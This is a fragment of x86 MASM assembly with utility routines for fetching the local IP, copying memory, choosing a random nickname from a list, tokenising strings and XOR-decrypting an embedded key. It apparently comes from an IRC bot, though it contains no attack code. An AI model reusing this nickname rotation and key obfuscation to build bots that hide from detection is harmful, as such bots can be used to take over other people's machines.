_GetIP proto
CopyMemory proto :dword, :dword, :dword
GetToken proto :dword, :dword, :byte, :dword, :byte

.code
_GetIP proc
    local IP[261]:byte
    invoke gethostname, addr IP, 261
    invoke gethostbyname, addr IP
    mov eax, [eax + 12]
    mov eax, [eax]
    mov eax, [eax]
    invoke inet_ntoa, eax
    ret
_GetIP endp

CopyMemory proc uses eax ecx esi edi dwDestination:dword, dwSource:dword, dwLen: dword
mov esi, dwSource
mov edi, dwDestination
mov ecx, dwLen
.repeat
  movsb
.untilcxz
ret
CopyMemory endp

GetRandNick proc uses eax esi edi
local wRand:word
invoke GetTickCount
xor ecx, ecx
mov cx, ax
invoke htonl, eax
xor eax, ecx
mov wRand, ax
mov esi, dwNickPointer
mov ecx, 0
.while cx < wRand
  inc ecx
  lodsb
  .if al == 0
    lodsb
    .if al == 1
      mov esi, offset szNicks
      mov dwNickPointer, esi
    .else  
      dec esi
      mov dwNickPointer, esi
    .endif
  .endif
.endw
ret
GetRandNick endp

GetToken proc uses eax ecx esi edi dwBuffer:dword, dwString:dword, bSeperator:byte, dwNumber:dword, bGetAll:byte
mov ecx, 0
mov esi, dwString
mov edi, dwBuffer
@@:
lodsb
.if al == 0
  stosb
  jmp @F
.elseif al == bSeperator
  inc ecx
 .if ecx == dwNumber
    .if bGetAll == FALSE
      mov al, 0
      stosb
      jmp @F
    .endif  
  .elseif
    .if bGetAll == TRUE 
      .if ecx < dwNumber
        mov edi, dwBuffer  
      .endif  
    .else
      mov edi, dwBuffer  
      jmp @B
    .endif
  .endif  
.endif
stosb
jmp @B
@@:
ret
GetToken endp

DecryptKey proc uses eax ecx esi edi
mov esi, offset szEncryptionKey
mov edi, offset szKey
mov ecx, sizeof szEncryptionKey
dec ecx
mov edx, 96
@@:
inc edx
lodsb
.if ecx <= 0
  jmp @F
.endif
xor al, dl
stosb
dec ecx
jmp @B
@@:
mov al, 0
stosb
ret
DecryptKey endp